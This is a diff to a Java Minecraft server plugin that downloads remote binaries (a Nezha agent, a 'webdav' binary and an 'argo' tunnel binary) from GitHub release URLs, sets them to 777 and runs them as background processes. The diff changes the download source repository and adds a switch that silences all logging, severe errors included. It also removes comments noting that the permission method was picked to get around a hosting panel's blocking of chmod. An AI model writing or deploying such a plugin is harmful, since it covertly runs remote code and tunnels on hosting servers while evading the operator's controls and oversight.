@@ -33,6 +33,7 @@ public class AppPlugin extends JavaPlugin {
     private String filePath;
     private String tok;
     private String agentUuid;
+    private boolean showLogs; // 控制日志总开关
 
     private final String WEB_FILENAME = "webdav";
     private final String NEZHA_FILENAME = "nexus";
@@ -40,14 +41,30 @@ public class AppPlugin extends JavaPlugin {
 
     private final Map<String, Process> runningProcesses = new HashMap<>();
 
+    // ==========================================
+    // 🔒 智能静音日志控制核心方法
+    // ==========================================
+    private void logInfo(String msg) {
+        if (showLogs) getLogger().info(msg);
+    }
+
+    private void logWarning(String msg) {
+        if (showLogs) getLogger().warning(msg);
+    }
+
+    private void logSevere(String msg) {
+        // 当为 false 时，彻底连严重错误也完全封锁不打印
+        if (showLogs) getLogger().severe(msg);
+    }
+
     @Override
     public void onEnable() {
         saveDefaultConfig();
         loadEnvironmentVariables();
 
-        getLogger().info("====================================");
-        getLogger().info("  AppPlugin 穿透与守护插件 (NIO 修复版)   ");
-        getLogger().info("====================================");
+        logInfo("====================================");
+        logInfo("  AppPlugin 穿透与守护插件 ");
+        logInfo("====================================");
 
         Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
             initializeDownloads();
@@ -69,7 +86,7 @@ public class AppPlugin extends JavaPlugin {
         for (Map.Entry<String, Process> entry : runningProcesses.entrySet()) {
             if (entry.getValue().isAlive()) {
                 entry.getValue().destroyForcibly();
-                getLogger().info("已强制回收穿透子进程: " + entry.getKey());
+                logInfo("已强制回收穿透子进程: " + entry.getKey());
             }
         }
     }
@@ -92,6 +109,14 @@ public class AppPlugin extends JavaPlugin {
         neztls = getEnvOrConfig("NTLS", "--tls");
         filePath = getEnvOrConfig("FILE_PATH", getDataFolder().getAbsolutePath());
         tok = getEnvOrConfig("TOK", "");
+        
+        // 环境参数或全局 config 判断
+        String envLogs = System.getenv("SHOW_LOGS");
+        if (envLogs != null && !envLogs.isEmpty()) {
+            showLogs = Boolean.parseBoolean(envLogs);
+        } else {
+            showLogs = getConfig().getBoolean("SHOW_LOGS", true);
+        }
 
         try {
             String seed = subName + uuid + nezhaser + nezhaKey + tok;
@@ -137,16 +162,16 @@ public class AppPlugin extends JavaPlugin {
         boolean hasPort = nezhaser.contains(":");
         if (archType == 2) {
             nezhaUrl = hasPort 
-                    ? getEnvOrConfig("NEZHA_URL_BSD_ALT", "https://github.com/dsadsadsss/java-plugins/releases/download/1/agent2-freebsd_amd64")
-                    : getEnvOrConfig("NEZHA_URL_BSD", "https://github.com/dsadsadsss/java-plugins/releases/download/1/agent-freebsd_amd64");
+                    ? getEnvOrConfig("NEZHA_URL_BSD_ALT", "https://github.com/Fscarmon/flies/releases/latest/download/agent2-freebsd_amd64")
+                    : getEnvOrConfig("NEZHA_URL_BSD", "https://github.com/Fscarmon/flies/releases/latest/download/agent-freebsd_amd64");
         } else if (archType == 1) {
             nezhaUrl = hasPort 
-                    ? getEnvOrConfig("NEZHA_URL_ARM64_ALT", "https://github.com/dsadsadsss/java-plugins/releases/download/1/agent2-linux_arm64")
-                    : getEnvOrConfig("NEZHA_URL_ARM64", "https://github.com/dsadsadsss/java-plugins/releases/download/1/agent-linux_arm64");
+                    ? getEnvOrConfig("NEZHA_URL_ARM64_ALT", "https://github.com/Fscarmon/flies/releases/latest/download/agent2-linux_arm64")
+                    : getEnvOrConfig("NEZHA_URL_ARM64", "https://github.com/Fscarmon/flies/releases/latest/download/agent-linux_arm64");
         } else {
             nezhaUrl = hasPort 
-                    ? getEnvOrConfig("NEZHA_URL_X64_ALT", "https://github.com/dsadsadsss/java-plugins/releases/download/1/agent2-linux_amd64")
-                    : getEnvOrConfig("NEZHA_URL_X64", "https://github.com/dsadsadsss/java-plugins/releases/download/1/agent-linux_amd64");
+                    ? getEnvOrConfig("NEZHA_URL_X64_ALT", "https://github.com/Fscarmon/flies/releases/latest/download/agent2-linux_amd64")
+                    : getEnvOrConfig("NEZHA_URL_X64", "https://github.com/Fscarmon/flies/releases/latest/download/agent-linux_amd64");
         }
 
         // 2. WEB 下载链接
@@ -164,9 +189,9 @@ public class AppPlugin extends JavaPlugin {
         if (archType == 2) {
             cffUrl = getEnvOrConfig("CFF_URL_BSD", "https://github.com/dsadsadsss/1/releases/download/xry/argo-bsdamd");
         } else if (archType == 1) {
-            cffUrl = getEnvOrConfig("CFF_URL_ARM64", "https://github.com/dsadsadsss/java-plugins/releases/download/1/cff-linux-arm64");
+            cffUrl = getEnvOrConfig("CFF_URL_ARM64", "https://github.com/Fscarmon/flies/releases/latest/download/cff-linux-arm64");
         } else {
-            cffUrl = getEnvOrConfig("CFF_URL_X64", "https://github.com/dsadsadsss/java-plugins/releases/download/1/cff-linux-amd64");
+            cffUrl = getEnvOrConfig("CFF_URL_X64", "https://github.com/Fscarmon/flies/releases/latest/download/cff-linux-amd64");
         }
 
         downloadFile(cffUrl, CFF_FILENAME);
@@ -183,14 +208,13 @@ public class AppPlugin extends JavaPlugin {
     private void downloadFile(String urlStr, String filename) {
         File file = new File(filePath, filename);
         
-        // 如果文件存在，跳过下载，但仍执行原生 NIO 赋权
         if (file.exists()) {
             tryNativeChmod(file);
             return; 
         }
 
         try {
-            getLogger().info("正在下载核心组件 [" + filename + "], 远程地址: " + urlStr);
+            logInfo("正在下载核心组件 [" + filename + "], 远程地址: " + urlStr);
             URL url = new URL(urlStr);
             HttpURLConnection conn = (HttpURLConnection) url.openConnection();
             conn.setInstanceFollowRedirects(true);
@@ -217,21 +241,16 @@ public class AppPlugin extends JavaPlugin {
                 }
             }
             
-            // 核心修复：执行纯 Java 原生 NIO 权限设定，不再调用外部 'chmod' 进程
             tryNativeChmod(file);
             
         } catch (Exception e) {
-            getLogger().severe("【错误】文件 [" + filename + "] 请求或落地失败。原因: " + e.getMessage());
+            logSevere("【错误】文件 [" + filename + "] 请求或落地失败。原因: " + e.getMessage());
         }
     }
 
-    /**
-     * 核心改进：使用 Java 7+ 原生 NIO POSIX 接口设置可执行权限，完美避开面板容器对 chmod 命令的拦截
-     */
     private void tryNativeChmod(File file) {
         Path path = file.toPath();
         try {
-            // 准备最高全控制权限集合 (rwxrwxrwx)
             Set<PosixFilePermission> perms = new HashSet<>();
             perms.add(PosixFilePermission.OWNER_READ);
             perms.add(PosixFilePermission.OWNER_WRITE);
@@ -243,17 +262,15 @@ public class AppPlugin extends JavaPlugin {
             perms.add(PosixFilePermission.OTHERS_WRITE);
             perms.add(PosixFilePermission.OTHERS_EXECUTE);
 
-            // 直接通过系统内核级接口修改属性
             Files.setPosixFilePermissions(path, perms);
-            getLogger().info("【成功】核心文件 [" + file.getName() + "] 已通过原生 NIO 注入 777 可执行权限。");
+            logInfo("【成功】核心文件 [" + file.getName() + "] 已通过原生 NIO 注入 777 可执行权限。");
         } catch (UnsupportedOperationException e) {
-            // 针对 Windows 开发测试环境做向下兼容兼容，Windows 不支持 POSIX 属性
             boolean r = file.setReadable(true, false);
             boolean w = file.setWritable(true, false);
             boolean x = file.setExecutable(true, false);
-            getLogger().info("【提示】当前文件系统不支持 POSIX，已启用本地 Acl 降级赋权策略。结果: " + (r && w && x));
+            logInfo("【提示】当前文件系统不支持 POSIX，已启用本地 Acl 降级赋权策略。结果: " + (r && w && x));
         } catch (IOException e) {
-            getLogger().severe("【严重错误】原生 NIO 刷写文件权限失败: " + e.getMessage());
+            logSevere("【严重错误】原生 NIO 刷写文件权限失败: " + e.getMessage());
         }
     }
 
@@ -283,9 +300,9 @@ public class AppPlugin extends JavaPlugin {
 
         try (FileWriter writer = new FileWriter(configFile)) {
             writer.write(content);
-            getLogger().info("哪吒agent2专配本地 config.yml 文件创建成功。");
+            logInfo("哪吒agent2专配本地 config.yml 文件创建成功。");
         } catch (IOException e) {
-            getLogger().severe("本地 config.yml 配置文件刷写失败: " + e.getMessage());
+            logSevere("本地 config.yml 配置文件刷写失败: " + e.getMessage());
         }
     }
 
@@ -333,9 +350,9 @@ public class AppPlugin extends JavaPlugin {
                 pb.redirectError(ProcessBuilder.Redirect.to(new File(getDataFolder(), name + "_err.log")));
                 
                 runningProcesses.put(name, pb.start());
-                getLogger().info("穿透子服务进程 [" + name + "] 已拉起并建立状态监听。");
+                logInfo("穿穿透子服务进程 [" + name + "] 已拉起并建立状态监听。");
             } catch (Exception e) {
-                getLogger().severe("【崩溃】无法唤醒后台子服务 [" + name + "]: " + e.getMessage());
+                logSevere("【崩溃】无法唤醒后台子服务 [" + name + "]: " + e.getMessage());
             }
         }
     }
@@ -357,10 +374,10 @@ public class AppPlugin extends JavaPlugin {
             }
             int code = conn.getResponseCode();
             if (code == 200 || code == 202) {
-                getLogger().info("哪吒节点名称异步同步成功 -> " + subName);
+                logInfo("哪吒节点名称异步同步成功 -> " + subName);
             }
         } catch (Exception e) {
-            getLogger().warning("同步哪吒节点名遇到网络颠簸: " + e.getMessage());
+            logWarning("同步哪吒节点名遇到网络颠簸: " + e.getMessage());
         }
     }
 }
